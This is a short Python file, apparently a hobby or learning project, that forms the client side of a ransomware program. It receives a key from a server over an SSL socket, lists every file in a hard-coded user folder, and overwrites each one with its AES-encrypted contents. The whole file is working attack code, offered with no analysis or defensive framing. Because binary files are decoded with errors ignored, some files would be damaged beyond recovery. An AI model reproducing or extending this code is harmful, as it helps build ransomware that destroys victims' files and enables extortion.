import socket
import SSL_Socket
import AES_Cipher
import Files_Enumeration

class Client:
    """A class which represent a client."""
    def __init__(self) -> None:
        self.clientSocket = SSL_Socket.SslSocket(isServer=False, sourceIp="localhost", sourcePort=1234, certFilePath="cert.crt")
        self.secretWord = self.clientSocket.GetMsg()
        print(self.secretWord)

        self.pathToEncrypt = "C:\\Users\\yuval\\Desktop\\ABC"
        self.listOfFiles = Files_Enumeration.FilesEnumeration(folderToScan=self.pathToEncrypt)

    
    def EncryptingFiles(self):
        # The function gets nothing.
        # The function encrypts all the files in the specific folder.
        tempEncryptedContent = ""
        for f in self.listOfFiles:
            with open(f, 'rb') as file:
                tempEncryptedContent = file.read()
            with open(f, 'w') as file:
                encrypted_content = AES_Cipher.AESCipher.aes_encrypt_decrypt(input_string=self.secretWord, message=tempEncryptedContent.decode('utf-8', errors='ignore'), action="encrypt")
                file.write(encrypted_content)
        print("All the files were encrypted successfully!")


if __name__ == "__main__":
    clientObject = Client()
    clientObject.EncryptingFiles()
